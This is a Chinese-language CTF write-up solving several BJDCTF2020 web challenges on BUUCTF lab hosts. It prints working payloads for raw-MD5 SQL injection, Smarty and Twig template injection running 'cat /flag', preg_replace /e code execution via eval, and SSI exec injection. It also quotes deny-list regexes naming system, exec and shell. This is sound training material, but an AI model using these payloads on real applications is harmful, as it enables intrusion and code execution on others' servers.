# Easy MD5

打开题目就一输入框把我整懵了，输入了没反应，然后目录扫描无果，查看网页源代码没发现敏感文件

然后在响应头发现

> Hint: select * from 'admin' where password=md5($pass,true)

输入`ffifdyop`

这样拼接以后就是`"select * from 'admin' where password='' or'6蒥欓!r,b' "`

or后面的句子第一个字母是非0打头的数字符，比如为 ‘ 1abc ’ 或者 ‘ -1bde ’都会被认为是true

之后进入下一个页面，查看网页源代码得到关键代码，直接数组绕过

```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

```
http://ec1c5bb6-221c-4577-8d10-0bc84cb670d0.node3.buuoj.cn/levels91.php?a[]=1&b[]=2
```

之后post

```
param1[]=1&param2[]=2
```

# [BJDCTF2020]Mark loves cat

首先查看网页源代码在网页最下方发现了dog，尝试以get请求拼接，无果，额只能目录扫描看看有啥可利用的了

发现.git源码泄露，使用GitHack获取关键源码

```
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';
//变量覆盖
foreach($_POST as $x => $y){
    $$x = $y;
}
//变量覆盖
foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){ //如果GET传入的参数当中没有flag则进入循环
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

payload1：

```
flag2=11&yds=flag
```

payload2：和上面是等价的

```
yds=flag
```

在页面最下方获取到flag



# [BJDCTF2020]The mystery of ip

一开始没有任何思路，但是在ip那里通过修改`X-Forwarded-For`请求头实现了任意ip，加了单引号等不报错，尝试SSTI

`{{6*6}}`成功输出36，`{{1.__class__}}`看见报错`Smarty Compiler: Syntax error in template`

知道了是Smarty模板，发送下面的请求包获取flag

```
GET /flag.php HTTP/1.1
Host: node3.buuoj.cn:29070
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://node3.buuoj.cn:29070/hint.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for:{system('cat /flag')}
Cookie: UM_distinctid=176eeefef524b1-06a7c2cac68426-3323765-144000-176eeefef5397e
Connection: close
```

# [BJDCTF2020]ZJCTF，不过如此

代码审计，从$text所指向的文件中读取字符串如果等于`I have a dream`则进入if语句，并且file参数当中不能包含flag，那么猜测flag就在flag.php了

```
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

第一处采用data伪协议绕过

```
data://text/palin,I have a dream
也可以间写为
data:text/palin,I have a dream
当然也可以用base64编码绕过一些其他题目
data://text/palin;base64,SSBoYXZlIGEgZHJlYW0=
```

之后根据hint，发现没有内容

```
http://url/?text=data://text/palin,I have a dream&file=next.php
```

hh，也是伪协议就行

```
http://url/?text=data://text/palin,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

将获取到的内容base64解码，一看就知道是`preg_match`在`/e`模式下的任意代码执行

```
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

官方payload`/?.*={${phpinfo()}}`
即

```
<?php
preg_replace('/(.*)/ei','strtolower("\\1")','{${phpinfo()}}');
```

但这里存在的问题是，GET方式传的字符串，`.`会被替换成`_`，这里采用`\S`匹配`非空白符`

最终payload

```
http://e49c97cc-c1be-4f59-a134-899ba54d7def.node3.buuoj.cn/next.php?\S*=${getFlag()}&cmd=system('cat /flag');
```

# [BJDCTF2020]Cookie is so stable

看标题就知道肯定要控制Cookie参数了，点进去发现和上面那道题一样，这里发现是SSTI

```
GET /flag.php HTTP/1.1
Host: 158d1f46-6c3f-41db-9658-2b7f600cc4ca.node3.buuoj.cn
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://158d1f46-6c3f-41db-9658-2b7f600cc4ca.node3.buuoj.cn/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=176eeefef524b1-06a7c2cac68426-3323765-144000-176eeefef5397e; PHPSESSID=3ee60c2faab39922d3ff170675090221; user={{6*6}}
Connection: close
```

测试`{{7*'7'}}`输出了49，发现是Twig模板注入，如果结果为7777777则为jinja

尝试很多payload以后发现下面这个可以

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

因此取得flag也很简单了

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

# [BJDCTF2020]EasySearch

一个简简单单的搜索框，之后我发现存在源码泄露`index.php.swp`

```
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

首先通过爆破实现登录

```
<?php
for ($i=0;$i<10000000;$i++){
    if('6d0bc1'==substr(md5($i),0,6)){
        echo $i.PHP_EOL;
    }
}
Result:
2020666
2305004
9162671
```

登陆后的那个是个错误页面，一直懵圈很久，最后看网上提示说用Burp，再响应头当中发现关键地址

```http
HTTP/1.1 200 OK
Server: openresty
Date: Mon, 11 Jan 2021 11:52:43 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 568
Connection: close
Url_is_here: public/d37fcb5c827625351e2795660b4c5e4e454b8df6.shtml
Vary: Accept-Encoding
X-Powered-By: PHP/7.1.27
```

之后访问，抓包修改发现下面两个都无法导致页面Client-IP的变更

```
client-ip:127.0.0.1
x-forwarded-for:127.0.0.1
```

最后看wp才知道原来是ssi,规定后缀为.shtml,在登陆界面,将username改掉改为这个

```
username=<!--#exec cmd="ls ../"-->
```

之后即可得到flag地址，之后也就是常规的RCE操作了无过滤就不写了

# [BJDCTF2020]EzPHP

打开环境在网页源代码中发现

```
<!-- Here is the real page =w= -->
<!-- GFXEIM3YFZYGQ4A= -->
全是大写猜测是base32编码
解码后1nD3x.php才是真正的地址
```

打开后啊这看着就烦，这么长一串，先去跑个步再回来做

```
<?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
```

做出来是乱码，难顶，这里放上[Y1ng师傅的wp](https://www.gem-love.com/ctf/770.html)

# Link Sharing

[仓库地址，有空复现以下题目](https://github.com/BjdsecCA/BJDCTF2020)

[SSI 注入的介绍和代码防御](https://blog.csdn.net/qq_29277155/article/details/52751364)